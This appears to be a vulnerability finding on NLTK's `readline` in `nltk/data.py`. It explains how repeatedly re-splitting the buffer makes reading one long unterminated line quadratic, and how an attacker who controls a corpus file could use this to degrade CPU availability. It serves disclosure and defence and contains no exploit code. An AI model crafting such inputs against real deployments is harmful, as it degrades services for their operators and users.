The `readline` loop violates the expectation that reading a line costs time linear in the line length. On each pass it executes `chars += new_chars; lines = chars.splitlines(True)`, scanning the whole accumulated buffer again rather than only the newly read block. Because `readsize` is capped at 8000 (`nltk/data.py:1997-1998`), the number of iterations grows linearly with the line length while each iteration's scan cost also grows linearly, producing quadratic total cost. The loop exits only on end of file or when `size is not None`; since the line-oriented block readers call `stream.readline()` with no argument, `size` defaults to `None` (`nltk/data.py:1942`) and that early break is unreachable on this path. There is no length cap on the assembled line and no wall-clock backstop, because no regular expression is involved on this path and the `nltk.redos` timeout therefore does not apply.

Default size=None on the corpus-view path:              nltk/data.py:1942

  SeekableUnicodeStreamReader construction.

An attacker who controls the bytes of a corpus file processed by a line-oriented NLTK corpus reader (encoding set, which is the common case) can craft one arbitrarily long unterminated line. The effect is recoverable CPU-availability degradation in the processing worker, not a crash: memory use remains linear and the operation completes once the buffer is exhausted. Because the constant factor is bounded by the 8000-character read cap, a meaningful denial of service requires a large crafted file, which keeps the severity in the low to medium range.
